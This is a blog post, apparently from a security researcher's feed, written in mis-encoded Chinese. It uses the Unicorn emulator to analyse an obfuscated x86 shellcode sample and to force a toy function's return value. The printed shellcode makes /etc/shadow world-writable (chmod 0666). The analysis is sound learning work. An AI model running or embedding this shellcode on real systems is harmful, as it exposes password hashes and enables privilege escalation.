<p>è¿™éƒ¨åˆ†çš„ä»£ç è¿˜åœ¨çœ‹ï¼Œè¦ç»“åˆ<a href="http://llvm.org/" target="_blank" rel="noopener">llvmçš„æ–‡æ¡£æ¥çœ‹</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;0x00-å‰è¨€&quot;&gt;&lt;a href=&quot;#0x00-å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;0x00:å‰è¨€&quot;&gt;&lt;/a&gt;0x00:å‰è¨€&lt;/h4&gt;&lt;p&gt;ä¸€ç›´æƒ³åšçš„fuzzeræ¶‰åŠåˆ°å¾ˆå¤šè¯­æ³•ç›¸å…³çš„ä¸œè¥¿ï¼Œç¼–è¯‘åŸç†ç›¸å…³çš„è¡¥è¯¾è¿«åœ¨çœ‰ç«-ã€‚- ä¸è¿‡ä¹Ÿåªèƒ½æ…¢æ…¢çš„æ¥å­¦ä¹ ã€‚è¿™ç¯‡æ–‡ç« å‡†å¤‡æ…¢æ…¢æ›´æ–°ï¼Œæ¶‰åŠæˆ‘çš„å­¦ä¹ è¿‡ç¨‹å’Œå¯¹ä»¥å‰çš„å¤§ä½¬çš„ä¸€ä¸ªtoy compilerçš„å­¦ä¹ ï¼Œç†è®º+å®è·µæ‰æ˜¯ç‹é“ã€‚&lt;/p&gt;
    
    </summary>
    
    
      <category term="study" scheme="http://o0xmuhe.me/tags/study/"/>
    
      <category term="compiler" scheme="http://o0xmuhe.me/tags/compiler/"/>
    
  </entry>
  
  <entry>
    <title>Unicorn Engineåˆä½“éªŒ</title>
    <link href="http://o0xmuhe.me/2018/01/15/Unicorn-Engine%E5%88%9D%E4%BD%93%E9%AA%8C/"/>
    <id>http://o0xmuhe.me/2018/01/15/Unicorn-Engineåˆä½“éªŒ/</id>
    <published>2018-01-15T14:29:01.000Z</published>
    <updated>2018-01-20T07:34:48.400Z</updated>
    
    <content type="html"><![CDATA[<h4 id="0x00-å…³äºunicorn-engine"><a href="#0x00-å…³äºunicorn-engine" class="headerlink" title="0x00:å…³äºunicorn engine"></a>0x00:å…³äºunicorn engine</h4><p>Unicorn Engineæ˜¯ä¸€ä¸ªæ¨¡æ‹Ÿå™¨(emulator)ï¼Œç®€å•çš„æ¥è¯´å°±æ˜¯å¯ä»¥æ¨¡æ‹Ÿæ‰§è¡Œç¨‹åºorç‰‡æ®µçš„ä»£ç ã€‚å¯¹äºé€†å‘åˆ†ææ¥è¯´å¾ˆæœ‰ç”¨ï¼Œæ¯”å¦‚åˆ†ææŸä¸ªç‰‡æ®µçš„ä»£ç çš„ä½œç”¨ï¼›å¯¹äºæ¼æ´æŒ–æ˜é€‰æ‰‹æ¥è¯´ï¼Œå‰ä¸€æ®µæ—¶é—´çš„unicorn-aflç€å®äº®çœ¼ï¼Œä¸è¿‡æœ‰å¸¦æ›´æ·±å…¥çš„ç ”ç©¶ã€‚</p>
<a id="more"></a>
<h4 id="0x01-å…³äºæœ¬æ–‡"><a href="#0x01-å…³äºæœ¬æ–‡" class="headerlink" title="0x01:å…³äºæœ¬æ–‡"></a>0x01:å…³äºæœ¬æ–‡</h4><p>å¾ˆå·§ï¼Œä»Šå¤©ç„æ­¦æ¨é€æ¨äº†ä¸€ç¯‡<a href="http://eternal.red/2018/unicorn-engine-tutorial/" target="_blank" rel="noopener">Unicorn Engine tutorial</a>ï¼Œæ„Ÿè§‰å†™çš„å¾ˆå¥½ï¼Œä½œè€…ä¹Ÿå¾ˆæœ‰è¶£ï¼Œæ–‡ç« ä¸­è¿˜å¸ƒç½®äº†<code>home work</code>ï¼Œå“ˆå“ˆå“ˆï¼Œä¸Šç­çš„æ—¶å€™æ²¡æ—¶é—´åšï¼Œä¸‹ç­å›åˆ°å®¶å°±çœ‹äº†çœ‹ï¼Œæ¨¡ä»¿è€…ç¬¬ä¸€ä¸ªä¾‹å­ï¼Œå’Œä½œè€…ç»™å‡ºçš„hintæŠŠä¸¤ä¸ª<code>home work</code>åšäº†ä¸‹ã€‚</p>
<h4 id="0x02-shellcodeåˆ†æ"><a href="#0x02-shellcodeåˆ†æ" class="headerlink" title="0x02: shellcodeåˆ†æ"></a>0x02: shellcodeåˆ†æ</h4><p>ä½œè€…åœ¨è¿™é‡Œç»™å‡ºäº†ä¸€æ®µæ··æ·†è¿‡çš„shellcodeï¼Œç›´æ¥åæ±‡ç¼–å™¨æŸ¥çœ‹çš„è¯ï¼Œå¹¶ä¸èƒ½ç›´æ¥åˆ†æå‡ºè¿™æ®µshellcodeçš„ä½œç”¨ã€‚<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shellcode = &quot;\xe8\xff\xff\xff\xff\xc0\x5d\x6a\x05\x5b\x29\xdd\x83\xc5\x4e\x89\xe9\x6a\x02\x03\x0c\x24\x5b\x31\xd2\x66\xba\x12\x00\x8b\x39\xc1\xe7\x10\xc1\xef\x10\x81\xe9\xfe\xff\xff\xff\x8b\x45\x00\xc1\xe0\x10\xc1\xe8\x10\x89\xc3\x09\xfb\x21\xf8\xf7\xd0\x21\xd8\x66\x89\x45\x00\x83\xc5\x02\x4a\x85\xd2\x0f\x85\xcf\xff\xff\xff\xec\x37\x75\x5d\x7a\x05\x28\xed\x24\xed\x24\xed\x0b\x88\x7f\xeb\x50\x98\x38\xf9\x5c\x96\x2b\x96\x70\xfe\xc6\xff\xc6\xff\x9f\x32\x1f\x58\x1e\x00\xd3\x80&quot;</span><br></pre></td></tr></table></figure></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># muhe @ muheMacBookPro in /tmp [22:38:29]</span><br><span class="line">$ python -c &apos;shellcode = &quot;\xe8\xff\xff\xff\xff\xc0\x5d\x6a\x05\x5b\x29\xdd\x83\xc5\x4e\x89\xe9\x6a\x02\x03\x0c\x24\x5b\x31\xd2\x66\xba\x12\x00\x8b\x39\xc1\xe7\x10\xc1\xef\x10\x81\xe9\xfe\xff\xff\xff\x8b\x45\x00\xc1\xe0\x10\xc1\xe8\x10\x89\xc3\x09\xfb\x21\xf8\xf7\xd0\x21\xd8\x66\x89\x45\x00\x83\xc5\x02\x4a\x85\xd2\x0f\x85\xcf\xff\xff\xff\xec\x37\x75\x5d\x7a\x05\x28\xed\x24\xed\x24\xed\x0b\x88\x7f\xeb\x50\x98\x38\xf9\x5c\x96\x2b\x96\x70\xfe\xc6\xff\xc6\xff\x9f\x32\x1f\x58\x1e\x00\xd3\x80&quot;;print shellcode&apos; &gt; sc.dump</span><br><span class="line"></span><br><span class="line"># muhe @ muheMacBookPro in /tmp [22:38:37]</span><br><span class="line">$ file sc.dump</span><br><span class="line">sc.dump: data</span><br></pre></td></tr></table></figure>
<p>ç”¨r2åˆ†æçš„è¯ï¼š</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">[0x00000000]&gt; pd</span><br><span class="line">            0x00000000      e8ffffffff     call 4</span><br><span class="line">            0x00000005      c05d6a05       rcr byte [rbp + 0x6a], 5</span><br><span class="line">            0x00000009      5b             pop rbx</span><br><span class="line">            0x0000000a      29dd           sub ebp, ebx</span><br><span class="line">            0x0000000c      83c54e         add ebp, 0x4e               ; <span class="string">'N'</span></span><br><span class="line">            0x0000000f      89e9           mov ecx, ebp</span><br><span class="line">            0x00000011      6a02           push 2                      ; 2</span><br><span class="line">            0x00000013      030c24         add ecx, dword [rsp]</span><br><span class="line">            0x00000016      5b             pop rbx</span><br><span class="line">            0x00000017      31d2           xor edx, edx</span><br><span class="line">            0x00000019      66ba1200       mov dx, 0x12                ; 18</span><br><span class="line">        â”Œâ”€&gt; 0x0000001d      8b39           mov edi, dword [rcx]</span><br><span class="line">        â   0x0000001f      c1e710         shl edi, 0x10</span><br><span class="line">        â   0x00000022      c1ef10         shr edi, 0x10</span><br><span class="line">        â   0x00000025      81e9feffffff   sub ecx, 0xfffffffe</span><br><span class="line">        â   0x0000002b      8b4500         mov eax, dword [rbp]</span><br><span class="line">        â   0x0000002e      c1e010         shl eax, 0x10</span><br><span class="line">        â   0x00000031      c1e810         shr eax, 0x10</span><br><span class="line">        â   0x00000034      89c3           mov ebx, eax</span><br><span class="line">        â   0x00000036      09fb           or ebx, edi</span><br><span class="line">        â   0x00000038      21f8           and eax, edi</span><br><span class="line">        â   0x0000003a      f7d0           not eax</span><br><span class="line">        â   0x0000003c      21d8           and eax, ebx</span><br><span class="line">        â   0x0000003e      66894500       mov word [rbp], ax</span><br><span class="line">        â   0x00000042      83c502         add ebp, 2</span><br><span class="line">        â   0x00000045      4a85d2         <span class="built_in">test</span> rdx, rdx</span><br><span class="line">        â””â”€&lt; 0x00000048      0f85cfffffff   jne 0x1d</span><br><span class="line">            0x0000004e      ec             <span class="keyword">in</span> al, dx</span><br><span class="line">            0x0000004f      37             invalid</span><br><span class="line">        â”Œâ”€&lt; 0x00000050      755d           jne 0xaf</span><br><span class="line">       â”Œâ”€â”€&lt; 0x00000052      7a05           jp 0x59</span><br><span class="line">       â”‚â”‚   0x00000054      28ed           sub ch, ch</span><br><span class="line">       â”‚â”‚   0x00000056      24ed           and al, 0xed</span><br><span class="line">       â”‚â”‚   0x00000058      24ed           and al, 0xed</span><br><span class="line">        â”‚   0x0000005a      0b887feb5098   or ecx, dword [rax - 0x67af1481]</span><br><span class="line">        â”‚   0x00000060      38f9           cmp cl, bh</span><br><span class="line">        â”‚   0x00000062      5c             pop rsp</span><br><span class="line">        â”‚   0x00000063      96             xchg eax, esi</span><br><span class="line">        â”‚   0x00000064      2b9670fec6ff   sub edx, dword [rsi - 0x390190]</span><br><span class="line">        â”‚   0x0000006a      c6             invalid</span><br><span class="line">        â”‚   0x0000006b      ff9f321f581e   lcall [rdi + 0x1e581f32]</span><br><span class="line">        â”‚   0x00000071      00d3           add bl, dl</span><br><span class="line">        â”‚   0x00000073      800aff         or byte [rdx], 0xff</span><br><span class="line">        â”‚   0x00000076      ff             invalid</span><br><span class="line">        â”‚   0x00000077      ff             invalid</span><br><span class="line">        â”‚   0x00000078      ff             invalid</span><br><span class="line">        â”‚   0x00000079      ff             invalid</span><br><span class="line">        â”‚   0x0000007a      ff             invalid</span><br><span class="line">        â”‚   0x0000007b      ff             invalid</span><br></pre></td></tr></table></figure>
<p>äº‹å®æ˜¯å•¥éƒ½çœ‹ä¸å‡ºæ¥ï¼Œä½†æ˜¯ä½œè€…è¯´ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Note that the architecture is x86-32 now. List of syscalls numbers can be found here.</span><br></pre></td></tr></table></figure>
<p>32ä½çš„ï¼Œè€Œä¸”æ˜¯è°ƒç”¨äº†ç³»ç»Ÿè°ƒç”¨æäº‹æƒ…çš„ã€‚<br>é‚£å°±å¯ä»¥æ¨¡ä»¿æ–‡ä¸­çš„ä¾‹å­ï¼Œæ¨¡æ‹Ÿæ‰§è¡Œè¿™æ®µä»£ç ï¼Œç„¶åå¯¹ç³»ç»Ÿè°ƒç”¨æ‰“hookï¼ŒæŠŠå‚æ•°printå‡ºæ¥ï¼Œç„¶åå†è·³è¿‡å»ã€‚</p>
<p>æ ¹æ®èµ„æ–™ï¼Œè°ƒç”¨å·æ”¾åœ¨eaxå¯„å­˜å™¨ï¼Œå‚æ•°çš„é¡ºåºæ˜¯ï¼šebx,ecx,edx,esi,ediã€‚<br>ä¸‹é¢å°±æ˜¯hookäº†<code>int 80h</code>æŒ‡ä»¤ï¼Œç„¶åæäº‹æƒ…ã€‚</p>
<p>æˆ‘çš„hookå‡½æ•°ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hook_code</span><span class="params">(mu, address, size, user_data)</span>:</span></span><br><span class="line">    op_code = mu.mem_read(address, size)</span><br><span class="line">    <span class="keyword">if</span> op_code == <span class="string">"\xcd\x80"</span>:</span><br><span class="line">        call_number = mu.reg_read(UC_X86_REG_EAX)</span><br><span class="line">        param1 = mu.reg_read(UC_X86_REG_EBX)</span><br><span class="line">        param2 = mu.reg_read(UC_X86_REG_ECX)</span><br><span class="line">        param3 = mu.reg_read(UC_X86_REG_EDX)</span><br><span class="line">        param4 = mu.reg_read(UC_X86_REG_ESI)</span><br><span class="line">        param5 = mu.reg_read(UC_X86_REG_EDI)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">print</span> (<span class="string">"[*]Result as followed:"</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">print</span> (<span class="string">"\tCall number: &#123;0&#125;"</span>.format(call_number))</span><br><span class="line">        <span class="keyword">print</span> (<span class="string">"\tParam1     : &#123;0&#125;"</span>.format(param1))</span><br><span class="line">        <span class="keyword">print</span> (<span class="string">"\tParam2     : &#123;0&#125;"</span>.format(param2))</span><br><span class="line">        <span class="keyword">print</span> (<span class="string">"\tParam3     : &#123;0&#125;"</span>.format(param3))</span><br><span class="line">        <span class="keyword">print</span> (<span class="string">"\tParam4     : &#123;0&#125;"</span>.format(param4))</span><br><span class="line">        <span class="keyword">print</span> (<span class="string">"\tParam5     : &#123;0&#125;"</span>.format(param5))</span><br><span class="line"></span><br><span class="line">        mu.reg_write(UC_X86_REG_EIP, address + size)</span><br></pre></td></tr></table></figure>
<p> è¿è¡Œç»“æœï¼š</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"> $ python task1.py</span><br><span class="line">[*]Result as followed:</span><br><span class="line">4Call number: 15</span><br><span class="line">4Param1     : 4194392</span><br><span class="line">4Param2     : 438</span><br><span class="line">4Param3     : 0</span><br><span class="line">4Param4     : 0</span><br><span class="line">4Param5     : 32979</span><br><span class="line">[*]Result as followed:</span><br><span class="line">4Call number: 1</span><br><span class="line">4Param1     : 4194392</span><br><span class="line">4Param2     : 438</span><br><span class="line">4Param3     : 0</span><br><span class="line">4Param4     : 0</span><br><span class="line">4Param5     : 32979</span><br></pre></td></tr></table></figure>
<p>ç¬¬å››ã€ç¬¬äº”ä¸ªå‚æ•°åº”è¯¥æ²¡ç”¨åˆ°ï¼Œç¬¬ä¸€æ¬¡è°ƒç”¨æ—¶15å·è°ƒç”¨ï¼Œç¬¬äºŒæ¬¡æ˜¯1å·è°ƒç”¨ã€‚æŸ¥äº†ä¸€ä¸‹ï¼Œ15å·æ˜¯chmodï¼Œ1å·æ˜¯exitã€‚<br>chmodçš„å‚æ•°åº”è¯¥æ˜¯æ–‡ä»¶åï¼Œæƒé™ã€‚exitçš„å‚æ•°çš„è¯ï¼Œå°±æ˜¯4194392ã€‚</p>
<p>å°±æ˜¯æƒ³åŠæ³•ç¡®å®šchmodæ“ä½œäº†ä»€ä¹ˆæ–‡ä»¶ï¼Œ4194392åº”è¯¥æ˜¯ä¸€ä¸ªæŒ‡é’ˆã€‚ä¿®æ”¹hookå‡½æ•°ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">print</span> (<span class="string">"\tCall number: &#123;0&#125;"</span>.format(call_number))</span><br><span class="line">        <span class="keyword">if</span> call_number == <span class="number">15</span>:</span><br><span class="line">            file = mu.mem_read(param1, <span class="number">32</span>).split(<span class="string">"\x00"</span>)[<span class="number">0</span>]</span><br><span class="line">            <span class="keyword">print</span> (<span class="string">"\t[*]File is &#123;0&#125;"</span>.format(file))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">print</span> (<span class="string">"\tParam1     : &#123;0&#125;"</span>.format(param1))</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">[*]Result as followed:</span><br><span class="line">4Call number: 15</span><br><span class="line">4[*]File is /etc/shadow</span><br><span class="line">4Param2     : 438</span><br><span class="line">4Param3     : 0</span><br><span class="line">4Param4     : 0</span><br><span class="line">4Param5     : 32979</span><br><span class="line">[*]Result as followed:</span><br><span class="line">4Call number: 1</span><br><span class="line">4Param1     : 4194392</span><br><span class="line">4Param2     : 438</span><br><span class="line">4Param3     : 0</span><br><span class="line">4Param4     : 0</span><br><span class="line">4Param5     : 32979</span><br></pre></td></tr></table></figure>
<p>chmodçš„ç¬¬äºŒä¸ªå‚æ•°å…¶å®å°±æ˜¯0666:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; oct(438)</span><br><span class="line">&apos;0666&apos;</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure>
<p>åˆ°æ­¤ï¼Œåˆ†æå®Œæ¯•ã€‚</p>
<h4 id="0x03-ä¿®æ”¹å‡½æ•°çš„è¿”å›å€¼"><a href="#0x03-ä¿®æ”¹å‡½æ•°çš„è¿”å›å€¼" class="headerlink" title="0x03: ä¿®æ”¹å‡½æ•°çš„è¿”å›å€¼"></a>0x03: ä¿®æ”¹å‡½æ•°çš„è¿”å›å€¼</h4><p>ä¿®æ”¹ä¸‹é¢ç¨‹åºçš„é€»è¾‘ï¼Œä½¿å¾—è¿”å›å€¼æ˜¯1ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">strcmp</span><span class="params">(<span class="keyword">char</span> *a, <span class="keyword">char</span> *b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//get length</span></span><br><span class="line">    <span class="keyword">int</span> len = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">char</span> *ptr = a;</span><br><span class="line">    <span class="keyword">while</span>(*ptr)</span><br><span class="line">    &#123;</span><br><span class="line">        ptr++;</span><br><span class="line">        len++;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//comparestrings</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;=len; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (a[i]!=b[i])</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">__attribute__((stdcall))</span><br><span class="line"><span class="function"><span class="keyword">int</span>  <span class="title">super_function</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">char</span> *b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (a==<span class="number">5</span> &amp;&amp; !<span class="built_in">strcmp</span>(b, <span class="string">"batman"</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    super_function(<span class="number">1</span>, <span class="string">"spiderman"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>è¿™ä¸ªä¹Ÿå¥½åšï¼Œç›´æ¥è°ƒç”¨super_function,ç„¶åæ ¹æ®æ ˆçš„ç»“æ„ï¼Œç›´æ¥æŠŠå‚æ•°æ”¹äº†ï¼Œå› ä¸ºæ˜¯x86ï¼Œcè¯­è¨€çš„è°ƒç”¨çº¦å®šæ˜¯ä»å³åˆ°å·¦ä¾æ¬¡å‹æ ˆï¼Œæ‰€ä»¥å­—ç¬¦ä¸²spidermançš„æŒ‡é’ˆæ˜¯ç¬¬ä¸€ä¸ªå‹æ ˆçš„ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">saved ebp</span><br><span class="line">ret addr</span><br><span class="line">1</span><br><span class="line">ptr ---&gt; &quot;spiderman\0&quot;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>å¤§æ¦‚å°±æ˜¯ä¸Šé¢è¿™æ ·ã€‚</p>
<p>è¿™éƒ¨åˆ†æ¯”è¾ƒå®¹æ˜“ï¼Œè‡ªå·±ç¼–è¯‘ä¸€ä¸ªè¿™ä¸ªç¨‹åºï¼Œç„¶åæ‰¾ä¸€ä¸‹super_functionå‡½æ•°çš„å¼€å¤´å’Œç»“å°¾ã€‚</p>
<p>è¿™ä¸ªbinæ–‡ä»¶åœ¨macä¸Šç¼–è¯‘å‡ºæ¥ï¼Œåœ°å€å•¥çš„ä¸ä¸€æ ·ï¼Œå†™è„šæœ¬çš„æ—¶å€™è¦æ³¨æ„ï¼Œbinæ–‡ä»¶æ˜ å°„åœ°å€æœ€å¥½æ˜¯idaé‡Œåˆ†æçš„æ–‡ä»¶èµ·å§‹åœ°å€ï¼Œè¿™æ ·çš„è¯ï¼Œåé¢è°ƒç”¨super funcçš„æ—¶å€™ï¼Œåœ°å€å•¥çš„å¯ä»¥ç›´æ¥ç”¨ã€‚</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> unicorn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> unicorn.x86_const <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span><span class="params">(name)</span>:</span></span><br><span class="line">    <span class="keyword">with</span> open(name) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">return</span> f.read()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">u32</span><span class="params">(data)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> struct.unpack(<span class="string">"I"</span>, data)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">p32</span><span class="params">(num)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> struct.pack(<span class="string">"I"</span>, num)</span><br><span class="line"></span><br><span class="line">mu = Uc (UC_ARCH_X86, UC_MODE_32)</span><br><span class="line"></span><br><span class="line">BASE = <span class="number">0x00000000</span></span><br><span class="line">STACK_ADDR = <span class="number">0x40000000</span></span><br><span class="line">STACK_SIZE = <span class="number">1024</span>*<span class="number">1024</span></span><br><span class="line"></span><br><span class="line">mu.mem_map(BASE, <span class="number">1024</span>*<span class="number">1024</span>)</span><br><span class="line">mu.mem_map(STACK_ADDR, STACK_SIZE)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mu.mem_write(BASE, read(<span class="string">"./function"</span>))</span><br><span class="line">r_esp = STACK_ADDR + (STACK_SIZE/<span class="number">2</span>)     <span class="comment">#ESP points to this address at function call</span></span><br><span class="line"></span><br><span class="line">STRING_ADDR = <span class="number">0x40000000</span></span><br><span class="line">mu.mem_write(STRING_ADDR, <span class="string">"batman\x00"</span>) <span class="comment">#write "batman" somewhere. We have choosen an address 0x0 which belongs to the stack.</span></span><br><span class="line"></span><br><span class="line">mu.reg_write(UC_X86_REG_ESP, r_esp)     <span class="comment">#set ESP</span></span><br><span class="line">mu.mem_write(r_esp+<span class="number">4</span>, p32(<span class="number">5</span>))           <span class="comment">#set the first argument. It is integer 5</span></span><br><span class="line">mu.mem_write(r_esp+<span class="number">8</span>, p32(STRING_ADDR)) <span class="comment">#set the second argument. This is a pointer to the string "batman"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mu.emu_start(<span class="number">0x0000057B</span>, <span class="number">0x000005B1</span>)      <span class="comment">#start emulation from the beginning of super_function, end at RET instruction</span></span><br><span class="line">return_value = mu.reg_read(UC_X86_REG_EAX)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"The returned value is: %d"</span> % return_value</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># muhe @ muheMacBookPro in ~/Downloads [15:19:10]</span></span><br><span class="line">$ python task2.py</span><br><span class="line">The returned value is: 1</span><br></pre></td></tr></table></figure>
<h4 id="0x04-arm32çš„ä¸€ä¸ªcm"><a href="#0x04-arm32çš„ä¸€ä¸ªcm" class="headerlink" title="0x04: arm32çš„ä¸€ä¸ªcm"></a>0x04: arm32çš„ä¸€ä¸ªcm</h4><p>ç±»ä¼¼äºä½œè€…åŸæ–‡çš„ç¬¬ä¸€ä¸ªdemoï¼Œå°±æ˜¯é‚£ä¸ªctfé¢˜ç›®ï¼Œåªä¸è¿‡è¿™æ¬¡archæ¢æˆäº†arm32ï¼Œæ³¨æ„å¤§å°ç«¯ã€‚</p>
